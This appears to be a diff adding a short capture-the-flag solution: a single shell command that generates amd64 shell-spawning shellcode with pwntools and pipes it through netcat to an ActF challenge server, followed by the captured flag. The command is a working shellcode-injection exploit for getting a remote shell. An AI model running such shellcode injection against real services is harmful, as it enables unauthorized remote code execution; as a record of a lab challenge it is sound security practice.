@@ -1,0 +1,3 @@
+$ (pwn shellcraft -f h amd64.sh; cat) | nc challs.actf.co 31200
+
+actf{python_is_memory_safe_4a105261}
